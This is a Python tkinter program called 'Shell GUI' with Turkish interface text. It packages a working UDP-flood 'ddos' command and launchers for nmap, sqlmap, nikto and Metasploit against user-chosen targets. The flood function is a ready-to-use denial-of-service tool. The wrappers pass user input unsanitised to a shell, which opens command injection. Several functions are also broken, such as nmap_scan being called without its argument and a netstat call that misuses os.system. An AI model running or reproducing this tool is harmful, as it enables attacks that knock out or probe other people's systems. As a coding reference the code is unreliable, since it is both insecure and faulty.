import tkinter as tk
from PIL import Image, ImageTk
import os
import socket
import subprocess
import random

command_history = []

def ddos_attack(target_ip, target_port, packet_count):
    output_text = "### DDOS Attack Started ###\n"
    output_text += f"Target IP: {target_ip}\n"
    output_text += f"Target Port: {target_port}\n"
    output_text += f"Packet Count: {packet_count}\n\n"

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(3000)
    count = 0

    try:
        for _ in range(packet_count):
            sock.sendto(bytes, (target_ip, target_port))
            count += 1
            output_text += f"ATTACKING, sent packets: {count}\n"
            insert_output(output_text)
            root.update_idletasks()

    except KeyboardInterrupt:
        output_text += "\nAttack interrupted by user.\n"
    finally:
        sock.close()

    insert_output(output_text)

def show_file_content(file_path):
    try:
        with open(file_path, 'r') as file:
            content = file.read()
            insert_output(f"\nDosya içeriği:\n{content}")
    except FileNotFoundError:
        insert_output("\nHata: Dosya bulunamadı. Lütfen geçerli bir dosya yolu girin.")
    except Exception as e:
        insert_output(f"\nBir hata oluştu: {e}")

def nmap_scan(target_ip):
    try:
        command = f"nmap {target_ip}"
        result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

        if result.returncode == 0:
            insert_output(f"\nNmap taraması başarıyla gerçekleştirildi. Sonuçlar:\n{result.stdout}")
        else:
            insert_output(f"\nNmap taraması başarısız. Hata:\n{result.stderr}")
    except Exception as e:
        insert_output(f"\nBir hata oluştu: {e}")

def list_files(directory="."):
    try:
        files = os.listdir(directory)
        file_list = "\nDosyalar:\n" + "\n".join(files)
        insert_output(file_list)
    except Exception as e:
        insert_output(f"\nDosyaları listelemede bir hata oluştu: {e}")

def list_network_connections():
    try:
        command = os.system("netstat -a")
        result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

        if result.returncode == 0:
            print("\nAğ bağlantıları başarıyla listelendi. Sonuçlar:\n{result.stdout}")
        else:
            print("\nAğ bağlantıları listelenirken bir hata oluştu. Hata:\n{result.stderr}")
    except Exception as e:
        print("\nBir hata oluştu: {e}")

def run_ping(target_ip):
    try:
        command = f"ping -c 4 {target_ip}"  # -c 4, 4 paket gönder demektir
        result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

        if result.returncode == 0:
            insert_output(f"\nPing başarıyla gerçekleştirildi. Sonuçlar:\n{result.stdout}")
        else:
            insert_output(f"\nPing başarısız. Hata:\n{result.stderr}")
    except Exception as e:
        insert_output(f"\nBir hata oluştu: {e}")

def run_metasploit():
    try:
        command = "msfconsole"
        subprocess.run(command, shell=True)
    except Exception as e:
        insert_output(f"\nMetasploit çalıştırılırken bir hata oluştu: {e}")

def run_sqlmap(target_url):
    try:
        command = f"sqlmap -u {target_url}"
        result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        insert_output(f"\nSQLMap çalıştırıldı. Sonuçlar:\n{result.stdout}\nHata Mesajı:\n{result.stderr}")
    except Exception as e:
        insert_output(f"\nSQLMap çalıştırılırken bir hata oluştu: {e}")

def run_nikto(target_url):
    try:
        command = f"nikto -h {target_url}"
        result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        insert_output(f"\nNikto çalıştırıldı. Sonuçlar:\n{result.stdout}\nHata Mesajı:\n{result.stderr}")
    except Exception as e:
        insert_output(f"\nNikto çalıştırılırken bir hata oluştu: {e}")

def show_help():
    commands = [
        "ddos <target_ip> <target_port> <packet_count> - DDOS saldırısı başlatır.",
        "showfile <file_path> - Belirtilen dosyanın içeriğini gösterir.",
        "nmap <target_ip> - Nmap taraması yapar.",
        "list_files [directory] - Belirtilen dizindeki dosyaları listeler.",
        "list_network_connections - Sistemdeki ağ bağlantılarını listeler.",
        "run_ping <target_ip> - Belirtilen IP adresine bir ping gönderir.",
        "run_metasploit - Metasploit Framework'ü başlatır.",
        "run_sqlmap <target_url> - Belirtilen URL üzerinde SQLMap çalıştırır.",
        "run_nikto <target_url> - Belirtilen URL üzerinde Nikto tarayıcısını çalıştırır.",
        "history - Komut geçmişini gösterir.",
        "clear or cls - Ekranı temizler.",
        "exit - Programdan çıkar."
    ]
    insert_output("\nKullanılabilir Komutlar ve Kullanımları:\n" + "\n".join(commands))

def insert_output(output):
    text_widget.insert(tk.END, output)
    text_widget.yview(tk.END)
    root.update_idletasks()

def run_command():
    user_input = entry.get()
    insert_output(f"Komut çalıştırılıyor: {user_input}")
    command_history.append(user_input)

    if user_input.lower() == "history":
        insert_output("\nKomut geçmişi:")
        for cmd in command_history:
            insert_output("\n " + cmd)
        return

    if user_input.lower() == "exit":
        insert_output("Programdan çıkılıyor.")
        root.destroy()
        return

    if user_input.lower() == "clear" or user_input.lower() == "cls":
        clear_console()
        return

    if user_input.lower() == "nmap":
        nmap_scan()
    elif user_input.lower() == "list_files":
        list_files()
    elif user_input.lower() == "list_network_connections":
        list_network_connections()
    elif user_input.lower().startswith("run_ping"):
        _, target_ip = user_input.split(" ", 1)
        run_ping(target_ip.strip())
    elif user_input.lower().startswith("run_metasploit"):
        run_metasploit()
    elif user_input.lower().startswith("run_sqlmap"):
        _, target_url = user_input.split(" ", 1)
        run_sqlmap(target_url.strip())
    elif user_input.lower().startswith("run_nikto"):
        _, target_url = user_input.split(" ", 1)
        run_nikto(target_url.strip())
    elif user_input.lower() == "help":
        show_help()

    try:
        command, params = user_input.split(" ", 1)
        if command.lower() == "ddos":
            ip, port, packet_count = params.split(" ")
            ddos_attack(ip, int(port), int(packet_count))
        elif command.lower() == "showfile":
            show_file_content(params)

    except ValueError:
        insert_output("Geçersiz komut. Lütfen düzgün formatda girin.")

def clear_console():
    text_widget.delete(1.0, tk.END)

def on_entry_click(event):
    if entry.get() == "Komut girin:":
        entry.delete(0, tk.END)
        entry.config(fg="black")

root = tk.Tk()
root.title("Shell GUI")

top_frame = tk.Frame(root, bg="red", pady=20)
top_frame.pack(side=tk.TOP, fill=tk.X)

label = tk.Label(top_frame, text="Powered by RedBith", font=("Holtwood One SC", 12), fg="red", bg="lightgray")
label.pack()

original_image = Image.open("zaa.jpg")
resized_image = original_image.resize((100, 100), Image.BICUBIC)
photo = ImageTk.PhotoImage(resized_image)

logo_label = tk.Label(top_frame, image=photo, bg="lightgray")
logo_label.image = photo
logo_label.pack(pady=10)

entry = tk.Entry(root, width=30, font=("Holtwood One SC", 15), fg="gray")
entry.insert(0, "Komut girin:")
entry.bind("<FocusIn>", on_entry_click)
entry.pack(pady=10)

enter_button = tk.Button(root, text="ENTER", command=run_command)
enter_button.pack(pady=10)

text_widget = tk.Text(root, wrap=tk.WORD, height=20, width=80)
text_widget.pack()

root.mainloop()
